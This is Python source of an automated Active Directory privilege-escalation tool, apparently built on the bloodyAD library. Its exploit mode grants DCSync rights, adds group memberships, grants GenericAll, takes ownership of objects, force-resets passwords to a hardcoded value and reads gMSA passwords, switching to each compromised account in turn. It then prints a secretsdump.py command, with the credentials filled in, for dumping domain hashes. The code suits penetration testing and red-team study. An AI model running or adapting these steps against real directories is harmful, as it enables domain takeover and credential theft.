from bloodyAD import ConnectionHandler
from bloodyAD.cli_modules import add, set, remove, get
from bloodyAD.exceptions import LOG
import base64
# Constant for password changes
PASSWORD_DEFAULT = "AutoBl00dy123!"

class Automation:
    def __init__(self, args, path):
        self.co_args = args
        self.path = path
        self.rel_types = {
            0: self._nextHop,
            1: self._dcSync,
            2: self._setDCSync,
            3: self._ownerDomain,
            100: self._addMember,
            200: self._aclGroup,
            300: self._ownerGroup,
            100000: self._forceChangePassword,
            100001: self._aclObj,
            100002: self._ownerObj,
            100100: self._forceChangePassword,
            100101: self._aclObj,
            100102: self._ownerObj,
            250: self._genericAll,
            350: self._ownerSpecialObj,
            400000: self._readGMSAPassword,
        }
        self.dirty_laundry = []

    async def simulate(self):
        self.simulation = True
        self.rel_str = {
            "setDCSync": "[Add DCSync right] to {}",
            "groupMember": "[Membership] on group {} for {}",
            "genericAll": "[GenericAll given] on {} to {}",
            "owner": "[Ownership Given] on {} to {}",
            "password": "[Change password] of {} to {}",
            "readGMSAPassword": "[Read GMSA Password] from {}",
        }
        print(f"\nAuthenticated as {self.co_args.username}:\n")
        await self._unfold()

    async def exploit(self):
        self.simulation = False
        # Add missing attributes for bloodyAD 2.x compatibility
        if not hasattr(self.co_args, 'gc'):
            self.co_args.gc = False
        if not hasattr(self.co_args, 'dc_ip'):
            self.co_args.dc_ip = ""
        if not hasattr(self.co_args, 'format'):
            self.co_args.format = ""
        if not hasattr(self.co_args, 'dns'):
            self.co_args.dns = ""
        if not hasattr(self.co_args, 'timeout'):
            self.co_args.timeout = 0
        # Convert kerberos boolean to krb_args list format expected by bloodyAD 2.x
        # Empty list means kerberos is enabled, None means disabled
        if hasattr(self.co_args, 'kerberos') and self.co_args.kerberos:
            self.co_args.kerberos = []
        else:
            self.co_args.kerberos = None
        # Convert secure boolean to integer format expected by bloodyAD 2.x
        if hasattr(self.co_args, 'secure') and self.co_args.secure:
            self.co_args.secure = 1
        else:
            self.co_args.secure = 0
            
        self.conn = ConnectionHandler(self.co_args)
        await self._unfold()
        await self.conn.rebind()

    async def _unfold(self):
        for rel in self.path:
            if not self.simulation:
                LOG.info("")
            typeID = rel["cost"]
            try:
                await self.rel_types[typeID](rel)
            except Exception as e:
                await self._washer()
                # Quick fix for issue #5 remove it when dropping Neo4j dependency
                if typeID == 9999999999:
                    raise ValueError("The path you're trying to exploit is not exploitable by autobloody only, you may need other tools to exploit it. See #Limitations in the README")
                raise e

    async def _washer(self):
        if self.simulation:
            print()
        self.dirty_laundry.reverse()
        for laundry in self.dirty_laundry:
            if self.simulation:
                self._printOperation(laundry["f"].__name__, laundry["args"], True)
            else:
                await laundry["f"](self.conn, *laundry["args"])
        self.dirty_laundry = []

    async def _switchUser(self, user, pwd):
        await self._washer()
        if self.simulation:
            print(f"\nAuthenticated as {user}:\n")
        else:
            # Close current connection
            await self.conn.closeLdap()
            
            # Create new args for the new user
            import copy
            new_args = copy.copy(self.co_args)
            new_args.username = user
            new_args.password = pwd
            
            # Create new ConnectionHandler with new credentials
            self.conn = ConnectionHandler(new_args)

    async def _nextHop(self, rel):
        return

    async def _dcSync(self, rel):
        if not self.simulation:
            print(
                "[+] You can now dump the NTDS using: secretsdump.py"
                f" '{self.conn.conf.domain}/{self.conn.conf.username}:{self.conn.conf.password}@{self.conn.conf.host}'"
            )

    async def _setDCSync(self, rel):
        operation = add.setDCSync
        if self.simulation:
            user = rel["start_node"]["name"]
            self._printOperation(operation.__name__, [user])
        else:
            user = rel["start_node"]["distinguishedname"]
            await operation(self.conn, user)

    async def _ownerDomain(self, rel):
        await self._setOwner(rel)
        await self._setDCSync(rel)

    async def _addMember(self, rel):
        add_operation = add.groupMember
        if self.simulation:
            member = rel["start_node"]["name"]
            group = rel["end_node"]["name"]
            self._printOperation(add_operation.__name__, [group, member])
        else:
            member = rel["start_node"]["objectid"]
            group = rel["end_node"]["distinguishedname"]
            await add_operation(self.conn, group, member)
            await self.conn.rebind()
        self.dirty_laundry.append({"f": remove.groupMember, "args": [group, member]})

    async def _aclGroup(self, rel):
        await self._genericAll(rel)
        await self._addMember(rel)

    async def _ownerGroup(self, rel):
        await self._setOwner(rel)
        await self._aclGroup(rel)

    async def _aclObj(self, rel):
        await self._genericAll(rel)
        await self._forceChangePassword(rel)

    async def _ownerObj(self, rel):
        await self._setOwner(rel)
        await self._aclObj(rel)

    async def _ownerSpecialObj(self, rel):
        await self._setOwner(rel)
        await self._genericAll(rel)

    # ForceChangePassword edge directly changes the password
    async def _forceChangePassword(self, rel):
        pwd = PASSWORD_DEFAULT
        if self.simulation:
            user = rel["end_node"]["name"]
            self._printOperation("password", [user, pwd])
        else:
            user_dn = rel["end_node"]["distinguishedname"]
            await set.password(self.conn, user_dn, pwd)
            ldap = await self.conn.getLdap()
            user_entry = None
            async for entry in ldap.bloodysearch(user_dn, attr=["sAMAccountName"]):
                user_entry = entry
                break
            user = user_entry["sAMAccountName"]
            LOG.debug(f"switching to LDAP connection for user {user}")
        await self._switchUser(user, pwd)

    async def _genericAll(self, rel):
        add_operation = add.genericAll
        if self.simulation:
            user = rel["start_node"]["name"]
            target = rel["end_node"]["name"]
            self._printOperation(add_operation.__name__, [target, user])
        else:
            user = rel["start_node"]["distinguishedname"]
            target = rel["end_node"]["distinguishedname"]
            await add_operation(self.conn, target, user)
        self.dirty_laundry.append({"f": remove.genericAll, "args": [target, user]})

    async def _setOwner(self, rel):
        operation = set.owner
        if self.simulation:
            user = rel["start_node"]["name"]
            target = rel["end_node"]["name"]
            self._printOperation(operation.__name__, [target, user])
        else:
            user = rel["start_node"]["distinguishedname"]
            target = rel["end_node"]["distinguishedname"]
            await operation(self.conn, target, user)

    async def _readGMSAPassword(self, rel):
        """Exploit ReadGMSAPassword edge to retrieve GMSA password"""
        if self.simulation:
            target = rel["end_node"]["name"]
            self._printOperation("readGMSAPassword", [target])
        else:
            target_dn = rel["end_node"]["distinguishedname"]
            
            # Read msDS-ManagedPassword attribute from the GMSA account
            # This returns the raw base64 encoded password blob
            password_blob = None
            async for entry in get.object(self.conn, target_dn, attr="msDS-ManagedPassword"):
                if "msDS-ManagedPassword" in entry:
                    password_blob = entry["msDS-ManagedPassword"]
                    break
            
            if password_blob:
                LOG.info(f"Retrieved GMSA password (base64): {password_blob}")
                print(f"[+] GMSA password retrieved (base64): {password_blob}")
                
                # Get the sAMAccountName for the GMSA account
                ldap = await self.conn.getLdap()
                user_entry = None
                async for entry in ldap.bloodysearch(target_dn, attr=["sAMAccountName"]):
                    user_entry = entry
                    break
                
                if user_entry:
                    user = user_entry["sAMAccountName"]
                    # Use the base64 encoded password directly
                    pwd = password_blob
                    LOG.info(f"Switching to GMSA account: {user}")
                    await self._switchUser(user, pwd)
                else:
                    LOG.warning("Could not retrieve sAMAccountName for GMSA account")
            else:
                LOG.error("Failed to retrieve GMSA password")


    def _printOperation(self, operation_name, operation_args, revert=False):
        operation_str = "\t"
        if revert:
            operation_str += "[-] Revert "
        else:
            operation_str += "[+] "

        operation_str += self.rel_str[operation_name]
        arg_nb = operation_str.count("{")
        print(operation_str.format(*operation_args[:arg_nb]))
